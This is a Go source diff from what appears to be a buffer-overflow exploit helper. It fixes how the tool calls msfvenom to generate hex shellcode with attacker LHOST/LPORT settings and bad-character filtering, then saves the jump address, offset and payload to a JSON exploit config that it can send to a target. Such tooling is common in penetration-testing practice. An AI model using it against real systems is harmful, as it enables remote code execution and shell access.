@@ -171,7 +171,7 @@ func generate(c Config, off int, jmp string, bad string, ptype string, send bool
 	venomCmd := path.Join(c.MsfPath, "msfvenom")
 	//venomArgs := fmt.Sprintf("-p %s LHOST=%s LPORT=%d EXITFUNC=thread -b \"%s\" -f hex -o payload.txt", ptype, ip, port, bad)
 	//out, err := exec.Command(venomCmd, venomArgs).Output()
-	cmd := exec.Command(venomCmd, "-p", ptype, fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), "-fhex", "-o payload.txt")
+	cmd := exec.Command(venomCmd, "-p", ptype, fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), "-fhex", "-o", "payload.txt")
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	err := cmd.Run()
@@ -184,18 +184,20 @@ func generate(c Config, off int, jmp string, bad string, ptype string, send bool
 	if err != nil {
 		log.Fatal(err)
 	}
+
 	//delete txt file
+	fmt.Println("Cleaning...")
 	_, err = exec.Command("rm", "payload.txt").Output()
 	if err != nil {
 		log.Fatal(err)
 	}
 	//make json
 	e := Exploit{Jmp: jmp, Offset: off, Payload: string(payload)}
-
 	err = saveConfig(e, "bof-exploit.json")
 	if err != nil {
 		log.Fatal(err)
 	}
+	fmt.Println("Exploit config saved to bof-exploit.json. Execute with:\n bof-helper execute -f bof-exploit.json")
 	//send if flag set
 	if send {
 		execute(c, e)
